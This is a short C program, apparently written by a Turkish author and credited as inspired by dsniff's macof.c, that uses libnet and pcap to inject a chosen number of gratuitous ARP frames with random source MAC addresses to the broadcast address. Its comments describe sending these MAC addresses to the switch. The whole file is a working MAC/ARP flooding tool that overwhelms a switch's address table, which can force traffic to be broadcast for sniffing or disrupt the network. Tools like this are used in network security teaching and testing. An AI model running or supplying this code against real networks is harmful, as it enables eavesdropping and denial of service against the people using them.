/*
 *Macof.c (dsniff library)'den esinlenerek Oguz Han Ayaz Tarafindan Yazilmistir.
 *
 *Copyright (c) 1999 Dug Song <dugsong@monkey.org>"
 */

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

static void usage(void){
printf("ARPFlooder <Tekrar Sayisi>\n");
  exit(1);
}

static void gen_mac(u_char *mac){
  *((in_addr_t *)mac) = libnet_get_prand(LIBNET_PRu32);
	*((u_short *)(mac + 4)) = libnet_get_prand(LIBNET_PRu16);
}

int main(int argc, char *argv[]){

  if(argc != 2)
    usage();

  int i;
  char *intrfc = NULL;   //Network arayüz ismi
  char libneterrorbuffer[LIBNET_ERRBUF_SIZE];  
  char pcaperrorbuffer[PCAP_ERRBUF_SIZE];
  libnet_t *context;
  u_char destmacaddr[ETHER_ADDR_LEN]; //hedef adres
  u_char srcmacaddr[ETHER_ADDR_LEN]; //kaynak adres

  //Inteface'i baslat
  intrfc = pcap_lookupdev(pcaperrorbuffer);

  //Icinde calistigimiz libnet icerigini baslat
  if ((context = libnet_init(LIBNET_LINK, intrfc, libneterrorbuffer)) == NULL){
    errx(1, "%s", libneterrorbuffer);
  }

  //libnet baglaminda rastgele seed olusturma
  libnet_seed_prand(context);

  //n, switche gonderecegimiz mac adresi sayisidir
  int n = atoi(argv[1]);

  for (i = 0; i < n; i++){

    //rastgele hedef ve kaynak mac adresleri olusturma
    memset(destmacaddr, 255, 6);
    gen_mac(srcmacaddr);

    uint8_t ip[4];
    bzero(ip, 4);

    //Gratuitous ARP Olusturma
    libnet_build_arp(ARPHRD_ETHER,         //donanim adres turu
                      ETHERTYPE_IP,        //protokol adres turu
                      6,                   //donanim adres boyutu
                      4,                   //protokol adres boyutu
                      2,                   //operation turu (ornegin : Gratuitous ARP icin 2)
                      srcmacaddr,          //gonderen donanim adresi
                      ip,                  //gonderen protokol adresi
                      srcmacaddr,          //hedef donanim adresi
                      ip,                  //hedef protokol adresi
                      NULL,                //payload
                      0,                   //Payload Length (Veri uzunlugu)
                      context,             //libnet icerigine bir pointer
                      0);                  //header protokol tagi (yeni bir tane olusturmak icin,0)
                      
	libnet_build_ethernet(destmacaddr,     //hedef ethernet adresi
                          srcmacaddr,      //kaynak ethernet adresi
                          ETHERTYPE_ARP,   //ust katman protokol turu
                          NULL,            //payload
                          0,               //payload length (Veri uzunluðu)
                          context,         //libnet icerigine bir pointer
                          0); 		   //header protokol tagi (yeni bir tane olusturmak icin,0)
   
    //paket injection
    if (libnet_write(context) < 0)
      errx(1, "Paket injection sirasinda hata");

    //baska bir injection icin context clearlanmali
    libnet_clear_packet(context);

    usleep(1000); //1000 mikrosaniye calisma gecikmesi,takibi kolaylastirmak amacli
    printf(" Injection Sayisi: %d\r", i+1);
  }
  printf(" Injection Sayisi: %d\n", n);
  return 1;
}
